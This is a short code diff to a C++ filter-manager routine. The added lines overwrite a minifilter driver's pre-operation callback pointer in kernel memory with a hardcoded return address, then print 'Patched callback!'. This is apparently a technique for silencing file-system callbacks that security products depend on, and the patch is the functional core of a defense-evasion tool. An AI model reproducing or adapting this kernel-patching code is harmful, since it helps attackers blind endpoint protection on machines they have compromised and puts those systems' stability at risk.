@@ -478,7 +478,14 @@ BOOL FltManager::RemovePreCallbacksForVolumesAndCallbacks(std::vector<FLT_OPERAT
 				);
 
 				if (lpPreOp == (DWORD64)op.PreOperation) {
+					DWORD64 lpRet1 = 0xfffff8042f3caab8;
 					printf("\tVol %S\n\tPreOp %llx\n\tCallbackNodePtr %llx\n", vol.first, op.PreOperation, lpListIter + CALLBACK_NODE_OFFSET_PREOP);
+					b = this->objMemHandler->VirtualWrite(
+						lpListIter + CALLBACK_NODE_OFFSET_PREOP,
+						&lpRet1,
+						sizeof(DWORD64)
+					);
+					puts("\t++ Patched callback! ++");
 				}
 
 				// read the next FLINK
